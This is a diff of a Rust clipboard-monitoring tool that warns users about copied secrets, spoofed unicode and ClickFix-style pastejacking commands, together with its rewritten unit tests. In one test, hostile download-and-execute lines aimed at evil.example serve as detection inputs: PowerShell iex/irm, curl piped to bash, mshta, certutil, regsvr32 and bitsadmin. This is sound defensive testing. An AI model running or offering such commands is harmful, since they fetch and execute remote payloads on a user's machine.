@@ -1187,6 +1436,34 @@ pub async fn get_paste_monitor_recent() -> Result<Vec<DetectionEvent>, String> {
 pub async fn clear_paste_monitor_recent() -> Result<(), String> {
     RECENT.lock().unwrap().clear();
     Ok(())
+}
+
+/// Honest health snapshot (plan §4.2 Phase 1): `listener_registered`,
+/// `rules_compiled`, `policy_current`, `clear_failing`, plus this file's
+/// own `helper_running`/`svc_reachable`. See the module doc / this file's
+/// handoff note for exact semantics a `capability_status` integration
+/// should rely on.
+#[tauri::command]
+pub async fn get_paste_monitor_health() -> Result<HelperHealth, String> {
+    Ok(*HEALTH.lock().unwrap())
+}
+
+/// Non-destructive peek at the queued content-free reports (e.g. for a
+/// settings-panel debug view). See `drain_paste_monitor_pending_reports`
+/// for the call a check-in integrator should actually use to flush them.
+#[tauri::command]
+pub async fn get_paste_monitor_pending_reports() -> Result<Vec<ClipboardEventReport>, String> {
+    Ok(PENDING_REPORTS.lock().unwrap().iter().cloned().collect())
+}
+
+/// Atomically return and clear every queued content-free report (plan
+/// §4.2 item 5: "queue a content-free report for the check-in path"). A
+/// future check-in integrator (`commander-pro` — a later workflow) should
+/// use this to flush events toward `CheckinBody.clipboard_events`.
+#[tauri::command]
+pub async fn drain_paste_monitor_pending_reports() -> Result<Vec<ClipboardEventReport>, String> {
+    let mut q = PENDING_REPORTS.lock().unwrap();
+    Ok(q.drain(..).collect())
 }
 
 // ── Crypto-swap toggle (paid) ───────────────────────────────────────
@@ -1255,117 +1532,611 @@ pub async fn get_paste_monitor_auto_clear_on_lock() -> Result<bool, String> {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-// TESTS — unicode-anomaly detection
+// TESTS
 // ═══════════════════════════════════════════════════════════════════════
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use wincmd_clip_rules::{compile, CompiledRuleSet, RuleSetLimits};
+
+    // ── Test helpers ──────────────────────────────────────────────────
+
+    /// Compile this file's free-tier ruleset for `enabled` and return it
+    /// plus the id→pattern lookup, WITHOUT touching any global state —
+    /// every test below builds its own local ruleset so tests can run in
+    /// parallel without interfering with each other.
+    fn compiled_for_test(
+        enabled: EnabledCategories,
+    ) -> (CompiledRuleSet, HashMap<RuleId, MatchedKind>) {
+        let (rules, lookup) = build_free_tier_rules(&enabled);
+        let compiled =
+            compile(&rules, &RuleSetLimits::default()).expect("free-tier ruleset always compiles");
+        (compiled, lookup)
+    }
+
+    /// Same ruleset, wrapped in a fresh local `PolicyStore` — needed by
+    /// tests that exercise `MatchEngine` (cooldown, truncation), which
+    /// requires an `ActivePolicy` rather than a bare `CompiledRuleSet`.
+    fn installed_policy_for_test(
+        enabled: EnabledCategories,
+    ) -> (PolicyStore, HashMap<RuleId, MatchedKind>) {
+        let (rules, lookup) = build_free_tier_rules(&enabled);
+        let mut store = PolicyStore::new();
+        store
+            .install(&ClipboardPolicyResponse {
+                policy_version: FREE_TIER_POLICY_VERSION,
+                rules,
+            })
+            .expect("free-tier ruleset always compiles");
+        (store, lookup)
+    }
+
+    /// End-to-end match, mirroring exactly what the live loop does: the
+    /// same `< 13 bytes` floor, then `evaluate`, then the name/severity
+    /// lookup — so these tests prove the REAL production decision, not an
+    /// approximation of it.
+    fn free_tier_match(
+        compiled: &CompiledRuleSet,
+        lookup: &HashMap<RuleId, MatchedKind>,
+        text: &str,
+    ) -> Option<(&'static str, &'static str)> {
+        if text.len() < 13 {
+            return None;
+        }
+        let verdict = compiled.evaluate(text)?;
+        let kind = *lookup.get(&verdict.rule_id)?;
+        Some((kind.display_name(), severity_label(verdict.severity)))
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // Free-tier parity — one (or a few) representative vector(s) per
+    // legacy category, proving same detection + same severity tier
+    // through the NEW wincmd_clip_rules-backed pipeline (plan's test
+    // list: "Behaviour parity for each of the 8 legacy categories").
+    // ═══════════════════════════════════════════════════════════════
 
     #[test]
-    fn confusable_host_detected() {
-        // Cyrillic 'а' (U+0430) in an otherwise-Latin paypal.com.
-        let text = "Click https://p\u{0430}ypal.com/login to verify";
+    fn cloud_api_patterns_detected_as_warning() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
         assert_eq!(
-            check_unicode_anomaly(text),
-            Some("Confusable URL Host (mixed scripts)")
+            free_tier_match(&compiled, &lookup, &format!("AKIA{}", "A".repeat(16))),
+            Some(("AWS Access Key", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("AIza{}", "A".repeat(35))),
+            Some(("Google API Key", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                &format!("SG.{}.{}", "A".repeat(22), "B".repeat(43))
+            ),
+            Some(("SendGrid API Key", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("key-{}", "a".repeat(32))),
+            Some(("Mailgun API Key", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("AC{}", "a".repeat(32))),
+            Some(("Twilio Account SID", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "postgres://user:pass@localhost/db"),
+            Some(("Database URL with credentials", "warning"))
         );
     }
 
     #[test]
-    fn clean_url_passes() {
-        let text = "Visit https://example.com/path for details";
-        assert_eq!(check_unicode_anomaly(text), None);
-    }
-
-    #[test]
-    fn bidi_override_outside_rtl_detected() {
-        // U+202E flips display order — classic filename-spoof trick.
-        let text = "report\u{202E}gpj.exe";
+    fn ai_api_patterns_detected_as_warning() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
         assert_eq!(
-            check_unicode_anomaly(text),
-            Some("Bidi Override (U+202D/E)")
+            free_tier_match(&compiled, &lookup, &format!("sk-proj-{}", "A".repeat(40))),
+            Some(("OpenAI Project Key", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("sk-{}", "A".repeat(48))),
+            Some(("OpenAI API Key", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("sk-ant-{}", "A".repeat(20))),
+            Some(("Anthropic API Key", "warning"))
         );
     }
 
     #[test]
-    fn bidi_override_in_rtl_context_passes() {
-        // Real Arabic text with bidi marker shouldn't fire.
-        let text = "اَلْعَرَبِيَّةُ\u{202E}";
-        assert_eq!(check_unicode_anomaly(text), None);
-    }
-
-    #[test]
-    fn zero_width_in_code_context_detected() {
-        // ZWSP between two letters — invisible payload injection.
-        let text = "let api\u{200B}Key = 'aws-real-secret'";
+    fn dev_tools_patterns_detected_as_warning() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
         assert_eq!(
-            check_unicode_anomaly(text),
-            Some("Zero-Width Chars in Code")
+            free_tier_match(&compiled, &lookup, &format!("ghp_{}", "A".repeat(36))),
+            Some(("GitHub Classic Personal Token", "warning"))
         );
-    }
-
-    #[test]
-    fn zero_width_in_emoji_sequence_passes() {
-        // ZWJ legitimately joining two emoji codepoints. The chars on
-        // either side aren't ASCII-alphanumeric so we should NOT fire.
-        let text = "👨\u{200D}👩";
-        assert_eq!(check_unicode_anomaly(text), None);
-    }
-
-    #[test]
-    fn first_url_host_picks_first() {
         assert_eq!(
-            first_url_host("see https://a.example.com/path and https://b.example.com"),
-            Some("a.example.com")
+            free_tier_match(
+                &compiled,
+                &lookup,
+                &format!("github_pat_{}", "A".repeat(20))
+            ),
+            Some(("GitHub Fine-Grained Token", "warning"))
         );
-        assert_eq!(first_url_host("no url here"), None);
-        assert_eq!(first_url_host("http://host.test?q=1"), Some("host.test"));
-    }
-
-    #[test]
-    fn category_enable_gates_unicode_check() {
-        let mut cats = EnabledCategories {
-            unicode: false,
-            ..Default::default()
-        };
-        let text = "https://p\u{0430}ypal.com";
-        assert!(check_patterns(text, &cats).is_none());
-
-        cats.unicode = true;
-        assert!(matches!(
-            check_patterns(text, &cats),
-            Some((_, Category::UnicodeAnomaly))
-        ));
-    }
-
-    #[test]
-    fn github_pat_variants_are_detected() {
-        let cats = EnabledCategories::default();
-        let classic = format!("ghu_{}", "A".repeat(36));
         assert_eq!(
-            check_patterns(&classic, &cats),
-            Some(("GitHub Classic Personal Token", Category::DevTools))
-        );
-
-        let fine_grained = format!("github_pat_{}", "A".repeat(70));
-        assert_eq!(
-            check_patterns(&fine_grained, &cats),
-            Some(("GitHub Fine-Grained Token", Category::DevTools))
+            free_tier_match(&compiled, &lookup, &format!("npm_{}", "A".repeat(36))),
+            Some(("NPM Token", "warning"))
         );
     }
 
     #[test]
     fn plain_pat_word_does_not_fire() {
-        let cats = EnabledCategories::default();
-        assert!(check_patterns("pat", &cats).is_none());
-        assert!(check_patterns("personal access token", &cats).is_none());
+        // Kept from the legacy test suite: a bare "pat"-adjacent word must
+        // never trip the GitHub token detectors.
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
+        assert_eq!(free_tier_match(&compiled, &lookup, "pat"), None);
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "personal access token"),
+            None
+        );
+    }
+
+    #[test]
+    fn payment_comms_patterns_detected_as_warning() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("sk_live_{}", "A".repeat(24))),
+            Some(("Stripe Live Secret", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("pk_live_{}", "A".repeat(24))),
+            Some(("Stripe Live Publishable", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("xoxb-{}", "A".repeat(10))),
+            Some(("Slack Token", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                &format!("{}.{}.{}", "A".repeat(24), "B".repeat(6), "C".repeat(27))
+            ),
+            Some(("Discord Bot Token", "warning"))
+        );
+    }
+
+    #[test]
+    fn keys_and_crypto_patterns_detected_as_warning() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "-----BEGIN RSA PRIVATE KEY-----"),
+            Some(("Private Key (PEM)", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                &format!(
+                    "eyJ{}.{}.{}",
+                    "A".repeat(10),
+                    "B".repeat(10),
+                    "C".repeat(10)
+                )
+            ),
+            Some(("JWT", "warning"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, &format!("5{}", "A".repeat(51))),
+            Some(("Bitcoin WIF Private Key", "warning"))
+        );
+        // The dedicated "SSH Private Key Header" name is unreachable in
+        // BOTH the legacy engine and this one: its exact text is one of
+        // `PrivateKeyPem`'s own alternation branches, so any string
+        // matching it also matches the (higher-priority, first-in-list)
+        // generic PEM header pattern. Not a regression — see
+        // `FREE_TIER_PATTERNS`'s doc comment on priority ordering.
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "-----BEGIN OPENSSH PRIVATE KEY-----"),
+            Some(("Private Key (PEM)", "warning"))
+        );
+    }
+
+    #[test]
+    fn malicious_command_patterns_detected_as_danger() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "powershell -enc SGVsbG8="),
+            Some(("PowerShell encoded payload", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "powershell -windowstyle hidden"),
+            Some(("Hidden PowerShell window", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "powershell -executionpolicy bypass"),
+            Some(("PowerShell ExecutionPolicy bypass", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                "iex (irm http://evil.example/payload.ps1)"
+            ),
+            Some(("PowerShell remote download + execute", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "mshta https://evil.example/payload.hta"),
+            Some(("mshta web payload", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                "certutil -urlcache -f https://evil.example/payload.exe"
+            ),
+            Some(("certutil web download", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                "regsvr32 /s /u /i:https://evil.example/payload.sct scrobj.dll"
+            ),
+            Some(("regsvr32 web payload", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                "bitsadmin /transfer myjob https://evil.example/payload.exe C:\\temp\\payload.exe"
+            ),
+            Some(("bitsadmin web transfer", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                "curl https://evil.example/install.sh | bash"
+            ),
+            Some(("curl/wget pipe to shell", "danger"))
+        );
+    }
+
+    #[test]
+    fn personal_data_credit_card_via_structured_luhn_check() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "4532015112830366"),
+            Some(("Credit Card Number", "warning"))
+        );
+        // Same length, last digit flipped — fails the Luhn check digit.
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "4532015112830367"),
+            None
+        );
+    }
+
+    #[test]
+    fn unicode_anomaly_patterns_detected_as_danger() {
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "report\u{202E}gpj.exe"),
+            Some(("Bidi Override (U+202D/E)", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, "let api\u{200B}Key = 'secretvalue'"),
+            Some(("Zero-Width Chars in Code", "danger"))
+        );
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                "Click https://p\u{0430}ypal.com/login to verify"
+            ),
+            Some(("Confusable URL Host (mixed scripts)", "danger"))
+        );
+        // A clean URL, no anomaly, must not fire.
+        assert_eq!(
+            free_tier_match(
+                &compiled,
+                &lookup,
+                "Visit https://example.com/path for details"
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn short_text_below_the_legacy_floor_never_matches() {
+        // Legacy quirk, kept for byte-for-byte parity: `check_patterns`
+        // gated EVERY check (including the unicode ones) behind a
+        // `text.len() < 13` floor, so even an unambiguous bidi-override on
+        // a very short string never fired. `free_tier_match` replicates
+        // that same floor — this pins the behaviour explicitly rather
+        // than leaving it as an incidental side effect of a shared helper.
+        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
+        assert_eq!(free_tier_match(&compiled, &lookup, "a\u{202E}b"), None);
+    }
+
+    #[test]
+    fn disabling_malicious_command_suppresses_those_patterns() {
+        let mut cats = EnabledCategories::default();
+        let text = "powershell -enc SGVsbG8=";
+
+        let (compiled, lookup) = compiled_for_test(cats);
+        assert!(free_tier_match(&compiled, &lookup, text).is_some());
+
+        cats.malicious_command = false;
+        let (compiled, lookup) = compiled_for_test(cats);
+        assert_eq!(free_tier_match(&compiled, &lookup, text), None);
+    }
+
+    #[test]
+    fn disabling_unicode_suppresses_unicode_anomaly_detection() {
+        let mut cats = EnabledCategories::default();
+        let text = "Click https://p\u{0430}ypal.com/login to verify";
+
+        let (compiled, lookup) = compiled_for_test(cats);
+        assert_eq!(
+            free_tier_match(&compiled, &lookup, text),
+            Some(("Confusable URL Host (mixed scripts)", "danger"))
+        );
+
+        cats.unicode = false;
+        let (compiled, lookup) = compiled_for_test(cats);
+        assert_eq!(free_tier_match(&compiled, &lookup, text), None);
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // Bounded read (1 MiB truncation) + per-rule cooldown, via
+    // `MatchEngine` — the exact engine the live loop drives.
+    // ═══════════════════════════════════════════════════════════════
+
+    #[test]
+    fn truncation_applies_before_matching_at_a_multibyte_boundary() {
+        let (store, _lookup) = installed_policy_for_test(EnabledCategories::default());
+        let mut engine = MatchEngine::new();
+        // Multi-byte filler so the 1 MiB cut point is guaranteed to land
+        // mid-codepoint if truncation weren't UTF-8-boundary-safe.
+        let filler: String = "é".repeat(clipboard_guard_helper::read::MAX_CLIPBOARD_READ_BYTES);
+        let text = format!("{filler}AKIA{}", "A".repeat(16));
+        let outcome = engine.observe(store.active(), &text, Instant::now());
+        assert_eq!(
+            outcome,
+            MatchOutcome::NoMatch,
+            "the AWS key lands past the 1 MiB read cap and must not be seen"
+        );
+    }
+
+    #[test]
+    fn repeated_matches_of_the_same_rule_are_suppressed_and_folded() {
+        let (store, lookup) = installed_policy_for_test(EnabledCategories::default());
+        let mut engine = MatchEngine::new();
+        let t0 = Instant::now();
+
+        let key_a = format!("AKIA{}", "A".repeat(16));
+        let key_b = format!("AKIA{}", "Z".repeat(16));
+
+        let first = engine.observe(store.active(), &key_a, t0);
+        let MatchOutcome::Emit {
+            verdict,
+            suppressed_since_last,
+        } = first
+        else {
+            panic!("expected the first AWS-key match to emit");
+        };
+        assert_eq!(suppressed_since_last, 0);
+        assert_eq!(
+            lookup
+                .get(&verdict.rule_id)
+                .copied()
+                .map(MatchedKind::display_name),
+            Some("AWS Access Key")
+        );
+
+        // A DIFFERENT AWS key, well within the free-tier cooldown window —
+        // must be folded into a count, never a second toast.
+        let second = engine.observe(store.active(), &key_b, t0 + Duration::from_secs(5));
+        assert_eq!(
+            second,
+            MatchOutcome::Suppressed {
+                rule_id: verdict.rule_id.clone(),
+                count: 1
+            }
+        );
+        let third = engine.observe(store.active(), &key_a, t0 + Duration::from_secs(10));
+        assert_eq!(
+            third,
+            MatchOutcome::Suppressed {
+                rule_id: verdict.rule_id.clone(),
+                count: 2
+            }
+        );
+
+        // Once the cooldown elapses, the next match emits again and folds
+        // in the suppressed count from the window that just ended.
+        let after = engine.observe(
+            store.active(),
+            &key_a,
+            t0 + Duration::from_secs(FREE_TIER_COOLDOWN_SECONDS as u64 + 1),
+        );
+        match after {
+            MatchOutcome::Emit {
+                suppressed_since_last,
+                ..
+            } => assert_eq!(suppressed_since_last, 2),
+            other => panic!("expected Emit with folded suppressed count, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn different_rules_have_independent_cooldowns() {
+        let (store, _lookup) = installed_policy_for_test(EnabledCategories::default());
+        let mut engine = MatchEngine::new();
+        let t0 = Instant::now();
+
+        let aws_key = format!("AKIA{}", "A".repeat(16));
+        let npm_token = format!("npm_{}", "A".repeat(36));
+
+        assert!(matches!(
+            engine.observe(store.active(), &aws_key, t0),
+            MatchOutcome::Emit { .. }
+        ));
+        // A different rule, same instant — its own cooldown hasn't started.
+        assert!(matches!(
+            engine.observe(store.active(), &npm_token, t0),
+            MatchOutcome::Emit { .. }
+        ));
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // Toast copy — pinned byte-for-byte (task constraint: "must not
+    // change the toast copy or severity strings users already see").
+    // ═══════════════════════════════════════════════════════════════
+
+    #[test]
+    fn detection_copy_uses_powershell_specific_danger_copy() {
+        let (title, body) = detection_copy("PowerShell encoded payload", "danger");
+        assert_eq!(title, "WinCommander · Dangerous PowerShell command");
+        assert_eq!(
+            body,
+            "Clipboard contains a PowerShell-style payload (PowerShell encoded payload). \
+            Do not paste it into Win+R, Terminal, or PowerShell unless you wrote it yourself."
+        );
+    }
+
+    #[test]
+    fn detection_copy_uses_generic_danger_copy_for_non_powershell() {
+        let (title, body) = detection_copy("mshta web payload", "danger");
+        assert_eq!(title, "WinCommander · Suspicious clipboard content");
+        assert_eq!(
+            body,
+            "You copied something that looks like a malware payload (mshta web payload). \
+            Do not paste this into Win+R, PowerShell, or any terminal. \
+            This is the ClickFix / pastejacking trick."
+        );
+    }
+
+    #[test]
+    fn detection_copy_uses_generic_warning_copy() {
+        let (title, body) = detection_copy("AWS Access Key", "warning");
+        assert_eq!(title, "WinCommander · Paste Monitor");
+        assert_eq!(
+            body,
+            "Looks like you copied a AWS Access Key — be careful where you paste it."
+        );
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // Content-free enforcement (plan §8) — end-to-end through THIS
+    // file's own match → report path, not just the wire type's shape.
+    // ═══════════════════════════════════════════════════════════════
+
+    #[test]
+    fn sentinel_clipboard_text_never_appears_in_the_built_report() {
+        const SENTINEL: &str = "SENTINEL_MARKER_zzz_do_not_leak_this_9F3C";
+        let (store, lookup) = installed_policy_for_test(EnabledCategories::default());
+        let mut engine = MatchEngine::new();
+
+        let clipboard_text = format!("{SENTINEL} AKIA{}", "A".repeat(16));
+        let outcome = engine.observe(store.active(), &clipboard_text, Instant::now());
+        let MatchOutcome::Emit {
+            verdict,
+            suppressed_since_last,
+        } = outcome
+        else {
+            panic!("expected the AWS-key rule to match and emit");
+        };
+        let kind = lookup
+            .get(&verdict.rule_id)
+            .copied()
+            .expect("known rule id");
+        assert_eq!(kind.display_name(), "AWS Access Key");
+
+        let report = build_pending_report(
+            FREE_TIER_POLICY_VERSION,
+            &verdict,
+            true,
+            suppressed_since_last,
+        );
+        let serialized = serde_json::to_string(&report).expect("report serializes");
+        assert!(
+            !serialized.contains(SENTINEL),
+            "clipboard text leaked into the report: {serialized}"
+        );
+        assert!(!serialized.contains(&clipboard_text));
+
+        // The DetectionEvent this file emits/logs is built from
+        // `kind.display_name()` and a fixed severity label only — never
+        // from `clipboard_text` — so its content-free-ness holds
+        // structurally, not by convention.
+        let event = DetectionEvent {
+            pattern: kind.display_name().to_string(),
+            severity: severity_label(verdict.severity).to_string(),
+            detected_at: chrono::Utc::now().to_rfc3339(),
+        };
+        let event_json = serde_json::to_string(&event).unwrap();
+        assert!(!event_json.contains(SENTINEL));
+    }
+
+    #[test]
+    fn build_pending_report_signature_cannot_carry_clipboard_text() {
+        // Documentation-as-test, mirroring `clipboard_guard_helper::
+        // report`'s own equivalent: pins the exact closed field set so a
+        // future edit that widens the wire report has to touch this
+        // assertion, making the change reviewable rather than silent.
+        let rule_id = RuleId::new("0e8f1a2b3c4d5e6f7a8b9c0d1e2f3a4b").unwrap();
+        let verdict = Verdict {
+            rule_id,
+            rule_revision: 1,
+            severity: Severity::Warn,
+            actions: vec![Action::NotifyUser],
+        };
+        let report = build_pending_report(1, &verdict, true, 0);
+        let value = serde_json::to_value(&report).unwrap();
+        let mut fields: Vec<&str> = value
+            .as_object()
+            .unwrap()
+            .keys()
+            .map(|s| s.as_str())
+            .collect();
+        fields.sort_unstable();
+        assert_eq!(
+            fields,
+            vec![
+                "actions_attempted",
+                "actions_succeeded",
+                "event_id",
+                "occurred_at",
+                "policy_version",
+                "rule_id",
+                "rule_revision",
+                "severity",
+                "suppressed_count",
+            ]
+        );
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // Clear-attempt health bookkeeping — "a failed clear reports
+    // attempted-not-succeeded" (plan §9 exit criterion).
+    // ═══════════════════════════════════════════════════════════════
+
+    #[test]
+    fn failed_clear_reports_clear_failing_true() {
+        assert!(clear_health_after_attempt(false));
+    }
+
+    #[test]
+    fn verified_clear_reports_clear_failing_false() {
+        assert!(!clear_health_after_attempt(true));
     }
 
     // ═══════════════════════════════════════════════════════════════
     // Crypto-address extraction (pure matcher) + swap window/debounce
     // (decide_crypto_swap with injected Instant — no real sleeps).
     // All addresses below are the clearly-fake T1 verification vectors.
+    // UNCHANGED by the Phase 1c re-point — see this section's own
+    // module-doc note above `CryptoFamily`.
     // ═══════════════════════════════════════════════════════════════
 
     // Two distinct same-family addresses for each family the swap
@@ -1610,7 +2381,8 @@ mod tests {
 
     // ═══════════════════════════════════════════════════════════════
     // Auto-clear deadline / hash-guard timing (should_auto_clear,
-    // schedule_clear) — deterministic, no real sleeps.
+    // schedule_clear) — deterministic, no real sleeps. UNCHANGED by the
+    // Phase 1c re-point.
     // ═══════════════════════════════════════════════════════════════
 
     #[test]
